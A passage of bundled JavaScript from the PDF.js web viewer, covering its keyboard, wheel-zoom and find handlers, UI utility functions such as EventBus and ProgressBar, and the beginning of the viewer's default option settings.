  if (PDFViewerApplication.supportsIntegratedFind) {
    PDFViewerApplication.externalServices.updateFindMatchesCount(matchesCount);
  } else {
    PDFViewerApplication.findBar.updateResultsCount(matchesCount);
  }
}

function webViewerUpdateFindControlState({
  state,
  previous,
  matchesCount
}) {
  if (PDFViewerApplication.supportsIntegratedFind) {
    PDFViewerApplication.externalServices.updateFindControlState({
      result: state,
      findPrevious: previous,
      matchesCount
    });
  } else {
    PDFViewerApplication.findBar.updateUIState(state, previous, matchesCount);
  }
}

function webViewerScaleChanging(evt) {
  PDFViewerApplication.toolbar.setPageScale(evt.presetValue, evt.scale);
  PDFViewerApplication.pdfViewer.update();
}

function webViewerRotationChanging(evt) {
  PDFViewerApplication.pdfThumbnailViewer.pagesRotation = evt.pagesRotation;
  PDFViewerApplication.forceRendering();
  PDFViewerApplication.pdfViewer.currentPageNumber = evt.pageNumber;
}

function webViewerPageChanging(evt) {
  const page = evt.pageNumber;
  PDFViewerApplication.toolbar.setPageNumber(page, evt.pageLabel || null);
  PDFViewerApplication.secondaryToolbar.setPageNumber(page);

  if (PDFViewerApplication.pdfSidebar.isThumbnailViewVisible) {
    PDFViewerApplication.pdfThumbnailViewer.scrollThumbnailIntoView(page);
  }

  if (typeof Stats !== "undefined" && Stats.enabled) {
    const pageView = PDFViewerApplication.pdfViewer.getPageView(page - 1);

    if (pageView && pageView.stats) {
      Stats.add(page, pageView.stats);
    }
  }
}

function webViewerVisibilityChange(evt) {
  if (document.visibilityState === "visible") {
    setZoomDisabledTimeout();
  }
}

let zoomDisabledTimeout = null;

function setZoomDisabledTimeout() {
  if (zoomDisabledTimeout) {
    clearTimeout(zoomDisabledTimeout);
  }

  zoomDisabledTimeout = setTimeout(function () {
    zoomDisabledTimeout = null;
  }, WHEEL_ZOOM_DISABLED_TIMEOUT);
}

function webViewerWheel(evt) {
  const {
    pdfViewer,
    supportedMouseWheelZoomModifierKeys
  } = PDFViewerApplication;

  if (pdfViewer.isInPresentationMode) {
    return;
  }

  if (evt.ctrlKey && supportedMouseWheelZoomModifierKeys.ctrlKey || evt.metaKey && supportedMouseWheelZoomModifierKeys.metaKey) {
    evt.preventDefault();

    if (zoomDisabledTimeout || document.visibilityState === "hidden") {
      return;
    }

    const previousScale = pdfViewer.currentScale;
    const delta = (0, _ui_utils.normalizeWheelEventDelta)(evt);
    const MOUSE_WHEEL_DELTA_PER_PAGE_SCALE = 3.0;
    const ticks = delta * MOUSE_WHEEL_DELTA_PER_PAGE_SCALE;

    if (ticks < 0) {
      PDFViewerApplication.zoomOut(-ticks);
    } else {
      PDFViewerApplication.zoomIn(ticks);
    }

    const currentScale = pdfViewer.currentScale;

    if (previousScale !== currentScale) {
      const scaleCorrectionFactor = currentScale / previousScale - 1;
      const rect = pdfViewer.container.getBoundingClientRect();
      const dx = evt.clientX - rect.left;
      const dy = evt.clientY - rect.top;
      pdfViewer.container.scrollLeft += dx * scaleCorrectionFactor;
      pdfViewer.container.scrollTop += dy * scaleCorrectionFactor;
    }
  } else {
    setZoomDisabledTimeout();
  }
}

function webViewerClick(evt) {
  if (!PDFViewerApplication.secondaryToolbar.isOpen) {
    return;
  }

  const appConfig = PDFViewerApplication.appConfig;

  if (PDFViewerApplication.pdfViewer.containsElement(evt.target) || appConfig.toolbar.container.contains(evt.target) && evt.target !== appConfig.secondaryToolbar.toggleButton) {
    PDFViewerApplication.secondaryToolbar.close();
  }
}

function webViewerKeyDown(evt) {
  if (PDFViewerApplication.overlayManager.active) {
    return;
  }

  let handled = false,
      ensureViewerFocused = false;
  const cmd = (evt.ctrlKey ? 1 : 0) | (evt.altKey ? 2 : 0) | (evt.shiftKey ? 4 : 0) | (evt.metaKey ? 8 : 0);
  const pdfViewer = PDFViewerApplication.pdfViewer;
  const isViewerInPresentationMode = pdfViewer && pdfViewer.isInPresentationMode;

  if (cmd === 1 || cmd === 8 || cmd === 5 || cmd === 12) {
    switch (evt.keyCode) {
      case 70:
        if (!PDFViewerApplication.supportsIntegratedFind) {
          PDFViewerApplication.findBar.open();
          handled = true;
        }

        break;

      case 71:
        if (!PDFViewerApplication.supportsIntegratedFind) {
          const findState = PDFViewerApplication.findController.state;

          if (findState) {
            PDFViewerApplication.findController.executeCommand("findagain", {
              query: findState.query,
              phraseSearch: findState.phraseSearch,
              caseSensitive: findState.caseSensitive,
              entireWord: findState.entireWord,
              highlightAll: findState.highlightAll,
              findPrevious: cmd === 5 || cmd === 12
            });
          }

          handled = true;
        }

        break;

      case 61:
      case 107:
      case 187:
      case 171:
        if (!isViewerInPresentationMode) {
          PDFViewerApplication.zoomIn();
        }

        handled = true;
        break;

      case 173:
      case 109:
      case 189:
        if (!isViewerInPresentationMode) {
          PDFViewerApplication.zoomOut();
        }

        handled = true;
        break;

      case 48:
      case 96:
        if (!isViewerInPresentationMode) {
          setTimeout(function () {
            PDFViewerApplication.zoomReset();
          });
          handled = false;
        }

        break;

      case 38:
        if (isViewerInPresentationMode || PDFViewerApplication.page > 1) {
          PDFViewerApplication.page = 1;
          handled = true;
          ensureViewerFocused = true;
        }

        break;

      case 40:
        if (isViewerInPresentationMode || PDFViewerApplication.page < PDFViewerApplication.pagesCount) {
          PDFViewerApplication.page = PDFViewerApplication.pagesCount;
          handled = true;
          ensureViewerFocused = true;
        }

        break;
    }
  }

  const {
    eventBus
  } = PDFViewerApplication;

  if (cmd === 1 || cmd === 8) {
    switch (evt.keyCode) {
      case 83:
        eventBus.dispatch("download", {
          source: window
        });
        handled = true;
        break;

      case 79:
        {
          eventBus.dispatch("openfile", {
            source: window
          });
          handled = true;
        }
        break;
    }
  }

  if (cmd === 3 || cmd === 10) {
    switch (evt.keyCode) {
      case 80:
        PDFViewerApplication.requestPresentationMode();
        handled = true;
        break;

      case 71:
        PDFViewerApplication.appConfig.toolbar.pageNumber.select();
        handled = true;
        break;
    }
  }

  if (handled) {
    if (ensureViewerFocused && !isViewerInPresentationMode) {
      pdfViewer.focus();
    }

    evt.preventDefault();
    return;
  }

  const curElement = document.activeElement || document.querySelector(":focus");
  const curElementTagName = curElement && curElement.tagName.toUpperCase();

  if (curElementTagName === "INPUT" || curElementTagName === "TEXTAREA" || curElementTagName === "SELECT" || curElement && curElement.isContentEditable) {
    if (evt.keyCode !== 27) {
      return;
    }
  }

  if (cmd === 0) {
    let turnPage = 0,
        turnOnlyIfPageFit = false;

    switch (evt.keyCode) {
      case 38:
      case 33:
        if (pdfViewer.isVerticalScrollbarEnabled) {
          turnOnlyIfPageFit = true;
        }

        turnPage = -1;
        break;

      case 8:
        if (!isViewerInPresentationMode) {
          turnOnlyIfPageFit = true;
        }

        turnPage = -1;
        break;

      case 37:
        if (pdfViewer.isHorizontalScrollbarEnabled) {
          turnOnlyIfPageFit = true;
        }

      case 75:
      case 80:
        turnPage = -1;
        break;

      case 27:
        if (PDFViewerApplication.secondaryToolbar.isOpen) {
          PDFViewerApplication.secondaryToolbar.close();
          handled = true;
        }

        if (!PDFViewerApplication.supportsIntegratedFind && PDFViewerApplication.findBar.opened) {
          PDFViewerApplication.findBar.close();
          handled = true;
        }

        break;

      case 40:
      case 34:
        if (pdfViewer.isVerticalScrollbarEnabled) {
          turnOnlyIfPageFit = true;
        }

        turnPage = 1;
        break;

      case 13:
      case 32:
        if (!isViewerInPresentationMode) {
          turnOnlyIfPageFit = true;
        }

        turnPage = 1;
        break;

      case 39:
        if (pdfViewer.isHorizontalScrollbarEnabled) {
          turnOnlyIfPageFit = true;
        }

      case 74:
      case 78:
        turnPage = 1;
        break;

      case 36:
        if (isViewerInPresentationMode || PDFViewerApplication.page > 1) {
          PDFViewerApplication.page = 1;
          handled = true;
          ensureViewerFocused = true;
        }

        break;

      case 35:
        if (isViewerInPresentationMode || PDFViewerApplication.page < PDFViewerApplication.pagesCount) {
          PDFViewerApplication.page = PDFViewerApplication.pagesCount;
          handled = true;
          ensureViewerFocused = true;
        }

        break;

      case 83:
        PDFViewerApplication.pdfCursorTools.switchTool(_pdf_cursor_tools.CursorTool.SELECT);
        break;

      case 72:
        PDFViewerApplication.pdfCursorTools.switchTool(_pdf_cursor_tools.CursorTool.HAND);
        break;

      case 82:
        PDFViewerApplication.rotatePages(90);
        break;

      case 115:
        PDFViewerApplication.pdfSidebar.toggle();
        break;
    }

    if (turnPage !== 0 && (!turnOnlyIfPageFit || pdfViewer.currentScaleValue === "page-fit")) {
      if (turnPage > 0) {
        if (PDFViewerApplication.page < PDFViewerApplication.pagesCount) {
          PDFViewerApplication.page++;
        }
      } else {
        if (PDFViewerApplication.page > 1) {
          PDFViewerApplication.page--;
        }
      }

      handled = true;
    }
  }

  if (cmd === 4) {
    switch (evt.keyCode) {
      case 13:
      case 32:
        if (!isViewerInPresentationMode && pdfViewer.currentScaleValue !== "page-fit") {
          break;
        }

        if (PDFViewerApplication.page > 1) {
          PDFViewerApplication.page--;
        }

        handled = true;
        break;

      case 82:
        PDFViewerApplication.rotatePages(-90);
        break;
    }
  }

  if (!handled && !isViewerInPresentationMode) {
    if (evt.keyCode >= 33 && evt.keyCode <= 40 || evt.keyCode === 32 && curElementTagName !== "BUTTON") {
      ensureViewerFocused = true;
    }
  }

  if (ensureViewerFocused && !pdfViewer.containsElement(curElement)) {
    pdfViewer.focus();
  }

  if (handled) {
    evt.preventDefault();
  }
}

function apiPageLayoutToSpreadMode(layout) {
  switch (layout) {
    case "SinglePage":
    case "OneColumn":
      return _ui_utils.SpreadMode.NONE;

    case "TwoColumnLeft":
    case "TwoPageLeft":
      return _ui_utils.SpreadMode.ODD;

    case "TwoColumnRight":
    case "TwoPageRight":
      return _ui_utils.SpreadMode.EVEN;
  }

  return _ui_utils.SpreadMode.NONE;
}

function apiPageModeToSidebarView(mode) {
  switch (mode) {
    case "UseNone":
      return _pdf_sidebar.SidebarView.NONE;

    case "UseThumbs":
      return _pdf_sidebar.SidebarView.THUMBS;

    case "UseOutlines":
      return _pdf_sidebar.SidebarView.OUTLINE;

    case "UseAttachments":
      return _pdf_sidebar.SidebarView.ATTACHMENTS;

    case "UseOC":
  }

  return _pdf_sidebar.SidebarView.NONE;
}

const PDFPrintServiceFactory = {
  instance: {
    supportsPrinting: false,

    createPrintService() {
      throw new Error("Not implemented: createPrintService");
    }

  }
};
exports.PDFPrintServiceFactory = PDFPrintServiceFactory;

/***/ }),
/* 2 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.isValidRotation = isValidRotation;
exports.isValidScrollMode = isValidScrollMode;
exports.isValidSpreadMode = isValidSpreadMode;
exports.isPortraitOrientation = isPortraitOrientation;
exports.clamp = clamp;
exports.getPDFFileNameFromURL = getPDFFileNameFromURL;
exports.noContextMenuHandler = noContextMenuHandler;
exports.parseQueryString = parseQueryString;
exports.backtrackBeforeAllVisibleElements = backtrackBeforeAllVisibleElements;
exports.getVisibleElements = getVisibleElements;
exports.roundToDivide = roundToDivide;
exports.getPageSizeInches = getPageSizeInches;
exports.approximateFraction = approximateFraction;
exports.getOutputScale = getOutputScale;
exports.scrollIntoView = scrollIntoView;
exports.watchScroll = watchScroll;
exports.binarySearchFirstItem = binarySearchFirstItem;
exports.normalizeWheelEventDelta = normalizeWheelEventDelta;
exports.waitOnEventOrTimeout = waitOnEventOrTimeout;
exports.moveToEndOfArray = moveToEndOfArray;
exports.WaitOnType = exports.animationStarted = exports.ProgressBar = exports.EventBus = exports.NullL10n = exports.SpreadMode = exports.ScrollMode = exports.TextLayerMode = exports.RendererType = exports.PresentationModeState = exports.VERTICAL_PADDING = exports.SCROLLBAR_PADDING = exports.MAX_AUTO_SCALE = exports.UNKNOWN_SCALE = exports.MAX_SCALE = exports.MIN_SCALE = exports.DEFAULT_SCALE = exports.DEFAULT_SCALE_VALUE = exports.CSS_UNITS = exports.AutoPrintRegExp = void 0;
const CSS_UNITS = 96.0 / 72.0;
exports.CSS_UNITS = CSS_UNITS;
const DEFAULT_SCALE_VALUE = "auto";
exports.DEFAULT_SCALE_VALUE = DEFAULT_SCALE_VALUE;
const DEFAULT_SCALE = 1.0;
exports.DEFAULT_SCALE = DEFAULT_SCALE;
const MIN_SCALE = 0.1;
exports.MIN_SCALE = MIN_SCALE;
const MAX_SCALE = 10.0;
exports.MAX_SCALE = MAX_SCALE;
const UNKNOWN_SCALE = 0;
exports.UNKNOWN_SCALE = UNKNOWN_SCALE;
const MAX_AUTO_SCALE = 1.25;
exports.MAX_AUTO_SCALE = MAX_AUTO_SCALE;
const SCROLLBAR_PADDING = 40;
exports.SCROLLBAR_PADDING = SCROLLBAR_PADDING;
const VERTICAL_PADDING = 5;
exports.VERTICAL_PADDING = VERTICAL_PADDING;
const PresentationModeState = {
  UNKNOWN: 0,
  NORMAL: 1,
  CHANGING: 2,
  FULLSCREEN: 3
};
exports.PresentationModeState = PresentationModeState;
const RendererType = {
  CANVAS: "canvas",
  SVG: "svg"
};
exports.RendererType = RendererType;
const TextLayerMode = {
  DISABLE: 0,
  ENABLE: 1,
  ENABLE_ENHANCE: 2
};
exports.TextLayerMode = TextLayerMode;
const ScrollMode = {
  UNKNOWN: -1,
  VERTICAL: 0,
  HORIZONTAL: 1,
  WRAPPED: 2
};
exports.ScrollMode = ScrollMode;
const SpreadMode = {
  UNKNOWN: -1,
  NONE: 0,
  ODD: 1,
  EVEN: 2
};
exports.SpreadMode = SpreadMode;
const AutoPrintRegExp = /\bprint\s*\(/;
exports.AutoPrintRegExp = AutoPrintRegExp;

function formatL10nValue(text, args) {
  if (!args) {
    return text;
  }

  return text.replace(/\{\{\s*(\w+)\s*\}\}/g, (all, name) => {
    return name in args ? args[name] : "{{" + name + "}}";
  });
}

const NullL10n = {
  async getLanguage() {
    return "en-us";
  },

  async getDirection() {
    return "ltr";
  },

  async get(property, args, fallback) {
    return formatL10nValue(fallback, args);
  },

  async translate(element) {}

};
exports.NullL10n = NullL10n;

function getOutputScale(ctx) {
  const devicePixelRatio = window.devicePixelRatio || 1;
  const backingStoreRatio = ctx.webkitBackingStorePixelRatio || ctx.mozBackingStorePixelRatio || ctx.msBackingStorePixelRatio || ctx.oBackingStorePixelRatio || ctx.backingStorePixelRatio || 1;
  const pixelRatio = devicePixelRatio / backingStoreRatio;
  return {
    sx: pixelRatio,
    sy: pixelRatio,
    scaled: pixelRatio !== 1
  };
}

function scrollIntoView(element, spot, skipOverflowHiddenElements = false) {
  let parent = element.offsetParent;

  if (!parent) {
    console.error("offsetParent is not set -- cannot scroll");
    return;
  }

  let offsetY = element.offsetTop + element.clientTop;
  let offsetX = element.offsetLeft + element.clientLeft;

  while (parent.clientHeight === parent.scrollHeight && parent.clientWidth === parent.scrollWidth || skipOverflowHiddenElements && getComputedStyle(parent).overflow === "hidden") {
    if (parent.dataset._scaleY) {
      offsetY /= parent.dataset._scaleY;
      offsetX /= parent.dataset._scaleX;
    }

    offsetY += parent.offsetTop;
    offsetX += parent.offsetLeft;
    parent = parent.offsetParent;

    if (!parent) {
      return;
    }
  }

  if (spot) {
    if (spot.top !== undefined) {
      offsetY += spot.top;
    }

    if (spot.left !== undefined) {
      offsetX += spot.left;
      parent.scrollLeft = offsetX;
    }
  }

  parent.scrollTop = offsetY;
}

function watchScroll(viewAreaElement, callback) {
  const debounceScroll = function (evt) {
    if (rAF) {
      return;
    }

    rAF = window.requestAnimationFrame(function viewAreaElementScrolled() {
      rAF = null;
      const currentX = viewAreaElement.scrollLeft;
      const lastX = state.lastX;

      if (currentX !== lastX) {
        state.right = currentX > lastX;
      }

      state.lastX = currentX;
      const currentY = viewAreaElement.scrollTop;
      const lastY = state.lastY;

      if (currentY !== lastY) {
        state.down = currentY > lastY;
      }

      state.lastY = currentY;
      callback(state);
    });
  };

  const state = {
    right: true,
    down: true,
    lastX: viewAreaElement.scrollLeft,
    lastY: viewAreaElement.scrollTop,
    _eventHandler: debounceScroll
  };
  let rAF = null;
  viewAreaElement.addEventListener("scroll", debounceScroll, true);
  return state;
}

function parseQueryString(query) {
  const parts = query.split("&");
  const params = Object.create(null);

  for (let i = 0, ii = parts.length; i < ii; ++i) {
    const param = parts[i].split("=");
    const key = param[0].toLowerCase();
    const value = param.length > 1 ? param[1] : null;
    params[decodeURIComponent(key)] = decodeURIComponent(value);
  }

  return params;
}

function binarySearchFirstItem(items, condition) {
  let minIndex = 0;
  let maxIndex = items.length - 1;

  if (maxIndex < 0 || !condition(items[maxIndex])) {
    return items.length;
  }

  if (condition(items[minIndex])) {
    return minIndex;
  }

  while (minIndex < maxIndex) {
    const currentIndex = minIndex + maxIndex >> 1;
    const currentItem = items[currentIndex];

    if (condition(currentItem)) {
      maxIndex = currentIndex;
    } else {
      minIndex = currentIndex + 1;
    }
  }

  return minIndex;
}

function approximateFraction(x) {
  if (Math.floor(x) === x) {
    return [x, 1];
  }

  const xinv = 1 / x;
  const limit = 8;

  if (xinv > limit) {
    return [1, limit];
  } else if (Math.floor(xinv) === xinv) {
    return [1, xinv];
  }

  const x_ = x > 1 ? xinv : x;
  let a = 0,
      b = 1,
      c = 1,
      d = 1;

  while (true) {
    const p = a + c,
          q = b + d;

    if (q > limit) {
      break;
    }

    if (x_ <= p / q) {
      c = p;
      d = q;
    } else {
      a = p;
      b = q;
    }
  }

  let result;

  if (x_ - a / b < c / d - x_) {
    result = x_ === x ? [a, b] : [b, a];
  } else {
    result = x_ === x ? [c, d] : [d, c];
  }

  return result;
}

function roundToDivide(x, div) {
  const r = x % div;
  return r === 0 ? x : Math.round(x - r + div);
}

function getPageSizeInches({
  view,
  userUnit,
  rotate
}) {
  const [x1, y1, x2, y2] = view;
  const changeOrientation = rotate % 180 !== 0;
  const width = (x2 - x1) / 72 * userUnit;
  const height = (y2 - y1) / 72 * userUnit;
  return {
    width: changeOrientation ? height : width,
    height: changeOrientation ? width : height
  };
}

function backtrackBeforeAllVisibleElements(index, views, top) {
  if (index < 2) {
    return index;
  }

  let elt = views[index].div;
  let pageTop = elt.offsetTop + elt.clientTop;

  if (pageTop >= top) {
    elt = views[index - 1].div;
    pageTop = elt.offsetTop + elt.clientTop;
  }

  for (let i = index - 2; i >= 0; --i) {
    elt = views[i].div;

    if (elt.offsetTop + elt.clientTop + elt.clientHeight <= pageTop) {
      break;
    }

    index = i;
  }

  return index;
}

function getVisibleElements(scrollEl, views, sortByVisibility = false, horizontal = false) {
  const top = scrollEl.scrollTop,
        bottom = top + scrollEl.clientHeight;
  const left = scrollEl.scrollLeft,
        right = left + scrollEl.clientWidth;

  function isElementBottomAfterViewTop(view) {
    const element = view.div;
    const elementBottom = element.offsetTop + element.clientTop + element.clientHeight;
    return elementBottom > top;
  }

  function isElementRightAfterViewLeft(view) {
    const element = view.div;
    const elementRight = element.offsetLeft + element.clientLeft + element.clientWidth;
    return elementRight > left;
  }

  const visible = [],
        numViews = views.length;
  let firstVisibleElementInd = numViews === 0 ? 0 : binarySearchFirstItem(views, horizontal ? isElementRightAfterViewLeft : isElementBottomAfterViewTop);

  if (firstVisibleElementInd > 0 && firstVisibleElementInd < numViews && !horizontal) {
    firstVisibleElementInd = backtrackBeforeAllVisibleElements(firstVisibleElementInd, views, top);
  }

  let lastEdge = horizontal ? right : -1;

  for (let i = firstVisibleElementInd; i < numViews; i++) {
    const view = views[i],
          element = view.div;
    const currentWidth = element.offsetLeft + element.clientLeft;
    const currentHeight = element.offsetTop + element.clientTop;
    const viewWidth = element.clientWidth,
          viewHeight = element.clientHeight;
    const viewRight = currentWidth + viewWidth;
    const viewBottom = currentHeight + viewHeight;

    if (lastEdge === -1) {
      if (viewBottom >= bottom) {
        lastEdge = viewBottom;
      }
    } else if ((horizontal ? currentWidth : currentHeight) > lastEdge) {
      break;
    }

    if (viewBottom <= top || currentHeight >= bottom || viewRight <= left || currentWidth >= right) {
      continue;
    }

    const hiddenHeight = Math.max(0, top - currentHeight) + Math.max(0, viewBottom - bottom);
    const hiddenWidth = Math.max(0, left - currentWidth) + Math.max(0, viewRight - right);
    const percent = (viewHeight - hiddenHeight) * (viewWidth - hiddenWidth) * 100 / viewHeight / viewWidth | 0;
    visible.push({
      id: view.id,
      x: currentWidth,
      y: currentHeight,
      view,
      percent
    });
  }

  const first = visible[0],
        last = visible[visible.length - 1];

  if (sortByVisibility) {
    visible.sort(function (a, b) {
      const pc = a.percent - b.percent;

      if (Math.abs(pc) > 0.001) {
        return -pc;
      }

      return a.id - b.id;
    });
  }

  return {
    first,
    last,
    views: visible
  };
}

function noContextMenuHandler(evt) {
  evt.preventDefault();
}

function isDataSchema(url) {
  let i = 0;
  const ii = url.length;

  while (i < ii && url[i].trim() === "") {
    i++;
  }

  return url.substring(i, i + 5).toLowerCase() === "data:";
}

function getPDFFileNameFromURL(url, defaultFilename = "document.pdf") {
  if (typeof url !== "string") {
    return defaultFilename;
  }

  if (isDataSchema(url)) {
    console.warn("getPDFFileNameFromURL: " + 'ignoring "data:" URL for performance reasons.');
    return defaultFilename;
  }

  const reURI = /^(?:(?:[^:]+:)?\/\/[^\/]+)?([^?#]*)(\?[^#]*)?(#.*)?$/;
  const reFilename = /[^\/?#=]+\.pdf\b(?!.*\.pdf\b)/i;
  const splitURI = reURI.exec(url);
  let suggestedFilename = reFilename.exec(splitURI[1]) || reFilename.exec(splitURI[2]) || reFilename.exec(splitURI[3]);

  if (suggestedFilename) {
    suggestedFilename = suggestedFilename[0];

    if (suggestedFilename.includes("%")) {
      try {
        suggestedFilename = reFilename.exec(decodeURIComponent(suggestedFilename))[0];
      } catch (ex) {}
    }
  }

  return suggestedFilename || defaultFilename;
}

function normalizeWheelEventDelta(evt) {
  let delta = Math.sqrt(evt.deltaX * evt.deltaX + evt.deltaY * evt.deltaY);
  const angle = Math.atan2(evt.deltaY, evt.deltaX);

  if (-0.25 * Math.PI < angle && angle < 0.75 * Math.PI) {
    delta = -delta;
  }

  const MOUSE_DOM_DELTA_PIXEL_MODE = 0;
  const MOUSE_DOM_DELTA_LINE_MODE = 1;
  const MOUSE_PIXELS_PER_LINE = 30;
  const MOUSE_LINES_PER_PAGE = 30;

  if (evt.deltaMode === MOUSE_DOM_DELTA_PIXEL_MODE) {
    delta /= MOUSE_PIXELS_PER_LINE * MOUSE_LINES_PER_PAGE;
  } else if (evt.deltaMode === MOUSE_DOM_DELTA_LINE_MODE) {
    delta /= MOUSE_LINES_PER_PAGE;
  }

  return delta;
}

function isValidRotation(angle) {
  return Number.isInteger(angle) && angle % 90 === 0;
}

function isValidScrollMode(mode) {
  return Number.isInteger(mode) && Object.values(ScrollMode).includes(mode) && mode !== ScrollMode.UNKNOWN;
}

function isValidSpreadMode(mode) {
  return Number.isInteger(mode) && Object.values(SpreadMode).includes(mode) && mode !== SpreadMode.UNKNOWN;
}

function isPortraitOrientation(size) {
  return size.width <= size.height;
}

const WaitOnType = {
  EVENT: "event",
  TIMEOUT: "timeout"
};
exports.WaitOnType = WaitOnType;

function waitOnEventOrTimeout({
  target,
  name,
  delay = 0
}) {
  return new Promise(function (resolve, reject) {
    if (typeof target !== "object" || !(name && typeof name === "string") || !(Number.isInteger(delay) && delay >= 0)) {
      throw new Error("waitOnEventOrTimeout - invalid parameters.");
    }

    function handler(type) {
      if (target instanceof EventBus) {
        target._off(name, eventHandler);
      } else {
        target.removeEventListener(name, eventHandler);
      }

      if (timeout) {
        clearTimeout(timeout);
      }

      resolve(type);
    }

    const eventHandler = handler.bind(null, WaitOnType.EVENT);

    if (target instanceof EventBus) {
      target._on(name, eventHandler);
    } else {
      target.addEventListener(name, eventHandler);
    }

    const timeoutHandler = handler.bind(null, WaitOnType.TIMEOUT);
    const timeout = setTimeout(timeoutHandler, delay);
  });
}

const animationStarted = new Promise(function (resolve) {
  window.requestAnimationFrame(resolve);
});
exports.animationStarted = animationStarted;

function dispatchDOMEvent(eventName, args = null) {
  throw new Error("Not implemented: dispatchDOMEvent");
}

class EventBus {
  constructor(options) {
    this._listeners = Object.create(null);
  }

  on(eventName, listener) {
    this._on(eventName, listener, {
      external: true
    });
  }

  off(eventName, listener) {
    this._off(eventName, listener, {
      external: true
    });
  }

  dispatch(eventName) {
    const eventListeners = this._listeners[eventName];

    if (!eventListeners || eventListeners.length === 0) {
      return;
    }

    const args = Array.prototype.slice.call(arguments, 1);
    let externalListeners;
    eventListeners.slice(0).forEach(function ({
      listener,
      external
    }) {
      if (external) {
        if (!externalListeners) {
          externalListeners = [];
        }

        externalListeners.push(listener);
        return;
      }

      listener.apply(null, args);
    });

    if (externalListeners) {
      externalListeners.forEach(function (listener) {
        listener.apply(null, args);
      });
      externalListeners = null;
    }
  }

  _on(eventName, listener, options = null) {
    let eventListeners = this._listeners[eventName];

    if (!eventListeners) {
      this._listeners[eventName] = eventListeners = [];
    }

    eventListeners.push({
      listener,
      external: (options && options.external) === true
    });
  }

  _off(eventName, listener, options = null) {
    const eventListeners = this._listeners[eventName];

    if (!eventListeners) {
      return;
    }

    for (let i = 0, ii = eventListeners.length; i < ii; i++) {
      if (eventListeners[i].listener === listener) {
        eventListeners.splice(i, 1);
        return;
      }
    }
  }

}

exports.EventBus = EventBus;

function clamp(v, min, max) {
  return Math.min(Math.max(v, min), max);
}

class ProgressBar {
  constructor(id, {
    height,
    width,
    units
  } = {}) {
    this.visible = true;
    this.div = document.querySelector(id + " .progress");
    this.bar = this.div.parentNode;
    this.height = height || 100;
    this.width = width || 100;
    this.units = units || "%";
    this.div.style.height = this.height + this.units;
    this.percent = 0;
  }

  _updateBar() {
    if (this._indeterminate) {
      this.div.classList.add("indeterminate");
      this.div.style.width = this.width + this.units;
      return;
    }

    this.div.classList.remove("indeterminate");
    const progressSize = this.width * this._percent / 100;
    this.div.style.width = progressSize + this.units;
  }

  get percent() {
    return this._percent;
  }

  set percent(val) {
    this._indeterminate = isNaN(val);
    this._percent = clamp(val, 0, 100);

    this._updateBar();
  }

  setWidth(viewer) {
    if (!viewer) {
      return;
    }

    const container = viewer.parentNode;
    const scrollbarWidth = container.offsetWidth - viewer.offsetWidth;

    if (scrollbarWidth > 0) {
      this.bar.style.width = `calc(100% - ${scrollbarWidth}px)`;
    }
  }

  hide() {
    if (!this.visible) {
      return;
    }

    this.visible = false;
    this.bar.classList.add("hidden");
    document.body.classList.remove("loadingInProgress");
  }

  show() {
    if (this.visible) {
      return;
    }

    this.visible = true;
    document.body.classList.add("loadingInProgress");
    this.bar.classList.remove("hidden");
  }

}

exports.ProgressBar = ProgressBar;

function moveToEndOfArray(arr, condition) {
  const moved = [],
        len = arr.length;
  let write = 0;

  for (let read = 0; read < len; ++read) {
    if (condition(arr[read])) {
      moved.push(arr[read]);
    } else {
      arr[write] = arr[read];
      ++write;
    }
  }

  for (let read = 0; write < len; ++read, ++write) {
    arr[write] = moved[read];
  }
}

/***/ }),
/* 3 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.OptionKind = exports.AppOptions = void 0;

var _viewer_compatibility = __webpack_require__(4);

const OptionKind = {
  VIEWER: 0x02,
  API: 0x04,
  WORKER: 0x08,
  PREFERENCE: 0x80
};
exports.OptionKind = OptionKind;
const defaultOptions = {
  cursorToolOnLoad: {
    value: 0,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  defaultUrl: {
    value: "compressed.tracemonkey-pldi-09.pdf",
    kind: OptionKind.VIEWER
  },
  defaultZoomValue: {
    value: "",
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  disableCreateObjectURL: {
    value: false,
    compatibility: _viewer_compatibility.viewerCompatibilityParams.disableCreateObjectURL,
    kind: OptionKind.VIEWER
  },
  disableHistory: {
    value: false,
    kind: OptionKind.VIEWER
  },
  disablePageLabels: {
    value: false,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  enablePermissions: {
    value: false,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  enablePrintAutoRotate: {
    value: false,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  enableWebGL: {
    value: false,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  externalLinkRel: {
    value: "noopener noreferrer nofollow",
    kind: OptionKind.VIEWER
  },
  externalLinkTarget: {
    value: 0,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  historyUpdateUrl: {
    value: false,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  ignoreDestinationZoom: {
    value: false,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  imageResourcesPath: {
    value: "./images/",
    kind: OptionKind.VIEWER
  },
  maxCanvasPixels: {
    value: 16777216,
    compatibility: _viewer_compatibility.viewerCompatibilityParams.maxCanvasPixels,
    kind: OptionKind.VIEWER
  },
  pdfBugEnabled: {
    value: false,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  printResolution: {
    value: 150,
    kind: OptionKind.VIEWER
  },
  renderer: {
    value: "canvas",
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  renderInteractiveForms: {
    value: false,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  sidebarViewOnLoad: {
    value: -1,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  scrollModeOnLoad: {
    value: -1,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  spreadModeOnLoad: {
    value: -1,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  textLayerMode: {
    value: 1,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  useOnlyCssZoom: {
    value: false,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  viewOnLoad: {
    value: 0,
    kind: OptionKind.VIEWER + OptionKind.PREFERENCE
  },
  cMapPacked: {
    value: true,
    kind: OptionKind.API
  },
